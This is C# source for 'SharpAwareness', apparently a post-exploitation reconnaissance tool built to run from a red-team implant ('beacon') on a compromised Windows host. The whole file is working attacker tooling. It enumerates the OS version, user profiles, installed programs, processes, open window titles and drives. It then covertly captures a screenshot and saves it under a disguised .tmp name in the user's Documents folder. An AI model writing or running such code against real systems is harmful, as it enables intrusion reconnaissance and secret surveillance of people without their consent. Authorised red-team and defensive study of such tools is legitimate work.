using System;
using Microsoft.Win32;
using System.Security.Principal;
using System.Management;
using System.Diagnostics;
using System.Collections.Generic;
using System.Net;
using System.IO;
using System.Windows;
using System.Text;
using System.Runtime.InteropServices;
using System.Drawing;

//My github - https://github.com/CodeXTF2
namespace sad{

    class Program{
[DllImport("user32.dll")]
static extern IntPtr GetForegroundWindow();

[DllImport("user32.dll")]
static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

public static string GetActiveWindowTitle()
{
    const int nChars = 256;
    StringBuilder Buff = new StringBuilder(nChars);
    IntPtr handle = GetForegroundWindow();

    if (GetWindowText(handle, Buff, nChars) > 0)
    {
        return Buff.ToString();
    }
    return null;
}
        public static string GetVersionInfo()
        {
            string HKLMWinNTCurrent = @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion";
            string osName = Registry.GetValue(HKLMWinNTCurrent, "productName", "").ToString();
            string osRelease = Registry.GetValue(HKLMWinNTCurrent, "ReleaseId", "").ToString();
            string osVersion = Environment.OSVersion.Version.ToString();
            string osType = Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit";
            string osBuild = Registry.GetValue(HKLMWinNTCurrent, "CurrentBuildNumber", "").ToString();
            string osUBR = Registry.GetValue(HKLMWinNTCurrent, "UBR", "").ToString();
            string versionstring = osName + "|" + osRelease + "|" + osVersion + "|" + osType + "|" + osBuild + "|" + osUBR;
            return versionstring;
        }



        public static void Main(string[] args){
            try{
                Console.WriteLine(" >> SharpAwareness << - by CodeX\n");
                try{
                //Get Windows Version
                    Console.WriteLine("\n[*] Windows Version:\n" + GetVersionInfo() + "\n");
                }catch{
                    Console.WriteLine("\n[!] Failed to get Windows version");
                }

                try{
                    //Get users that have logged in to this box
                    var localusers = Directory.GetDirectories("C:\\Users");
                    Console.WriteLine("\n[*] Local users:");
                    for (int i = 0; i < localusers.Length; i++)
                    {
                        if(localusers[i] != "C:\\Users\\Public" && localusers[i] != "C:\\Users\\All Users"){
                            Console.WriteLine(localusers[i]);
                        }
                    }
                }catch{
                    Console.WriteLine("\n[!] Failed to enumerate local users");
                }

                try{
                    //Installed programs
                    var programfiles = Directory.GetDirectories("C:\\Program Files");
                    Console.WriteLine("\n[*] Installed programs:");
                    for (int i = 0; i < programfiles.Length; i++)
                    {
        
                        Console.WriteLine(programfiles[i]);
                        
                    }
                    var programfiles2 = Directory.GetDirectories("C:\\Program Files (x86)");
                    for (int i = 0; i < programfiles2.Length; i++)
                    {
        
                        Console.WriteLine(programfiles2[i]);
                        
                    }
                }catch{
                    Console.WriteLine("\n[!] Failed to enumerate installed programs");
                }

                try{
                    //Running processes
                    Console.WriteLine("\n[*] Running processes:");
                    Process[] processCollection = Process.GetProcesses();  
                    foreach (Process p in processCollection)  
                    {  
                        try{
                            Console.WriteLine(p.Id + " " + p.ProcessName + " - " + p.MainModule.FileVersionInfo.FileDescription);
                        }catch{
                            Console.WriteLine(p.Id + " " + p.ProcessName); 
                        }
        
                    }  
                }catch{
                    Console.WriteLine("\n[!] Failed to enumerate running processes");
                }

                //Foreground window

                try{
                    Console.WriteLine("\n[*] Open windows - What is our user doing?:");
                    Process[] processlist = Process.GetProcesses();

                    foreach (Process process in processlist)
                    {
                        if (!String.IsNullOrEmpty(process.MainWindowTitle))
                        {
                            Console.WriteLine("Process: {0} ID: {1} Window title: {2}", process.ProcessName, process.Id, process.MainWindowTitle);
                        }
                    }
                    Console.WriteLine("\n[*] Foreground window");
                    Console.WriteLine(GetActiveWindowTitle());
                }catch{
                    Console.WriteLine("\n[!] Failed to list open windows");
                }
                try{
                    //Drives
                    Console.WriteLine("\n[*] Logical drives");
                    string[] drives = System.IO.Directory.GetLogicalDrives();

                    foreach (string str in drives) 
                    {
                        System.Console.WriteLine(str);
                    }
                }catch{
                    Console.WriteLine("\n[!] Failed to enumerate logical drives");
                }

                //Take screenshot
                try{
                    Console.WriteLine("\n[*] Taking screenshot");
                    Bitmap memoryImage;

                    memoryImage = new Bitmap(1920, 1080);
                    Size s = new Size(memoryImage.Width, memoryImage.Height);
        
                    Graphics memoryGraphics = Graphics.FromImage(memoryImage);
        
                    memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
        
                    //That's it! Save the image in the directory and this will work like charm.
                    string fileName = string.Format(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) +
                            @"\tmp" + "_" +
                            DateTime.Now.ToString("hhmmss") + ".tmp");
        
                    // save it
                    memoryImage.Save(fileName);
                    Console.WriteLine("- Screenshot saved as " + fileName);
                }catch{
                    Console.WriteLine("\n[!] Failed to take screenshot");
                }


            }catch{
                Console.WriteLine("SharpAwareness broke :( At least we didn't kill your beacon!");
            }
        
        }

    }


}